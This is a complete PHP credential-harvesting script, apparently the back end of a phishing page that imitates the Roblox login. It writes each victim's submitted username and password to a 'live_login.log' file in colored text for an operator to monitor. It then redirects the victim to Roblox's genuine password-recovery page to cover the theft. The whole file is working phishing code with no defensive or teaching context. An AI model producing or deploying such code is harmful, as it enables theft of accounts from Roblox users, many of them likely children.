<?php
$BRIGHT_GREEN = "\033[1;92m";
$BRIGHT_CYAN = "\033[1;96m";
$BRIGHT_YELLOW = "\033[1;93m";
$RESET = "\033[0m";

file_put_contents("live_login.log", 
    "{$BRIGHT_YELLOW}Roblox {$BRIGHT_CYAN}Username: {$BRIGHT_GREEN}" . $_POST['username'] . 
    " {$BRIGHT_CYAN}Pass: {$BRIGHT_GREEN}" . $_POST['password'] . "{$RESET}\n", 
    FILE_APPEND
);

header('Location: https://www.roblox.com/login/forgot-password-or-username/');
exit();
?>